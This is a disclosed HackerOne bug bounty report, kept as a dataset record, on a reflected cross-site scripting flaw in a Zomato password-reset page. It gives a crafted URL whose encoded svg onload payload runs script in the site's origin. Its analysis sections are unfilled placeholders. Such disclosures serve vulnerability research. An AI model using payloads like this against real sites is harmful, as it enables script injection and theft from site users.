---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '114151'
original_report_id: '114151'
title: Cross Site Scripting - type Patameter
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zomato
created_at: '2016-02-02T15:47:22.755Z'
disclosed_at: '2016-03-06T08:49:31.222Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross Site Scripting - type Patameter

## Metadata

- HackerOne Report ID: 114151
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zomato
- Disclosed At: 2016-03-06T08:49:31.222Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

Please find below crafted URL to reproduce the reflected XSS:
> https://www.zomato.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E

Access above URL (Tested on Firefox) to reproduce the issue.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
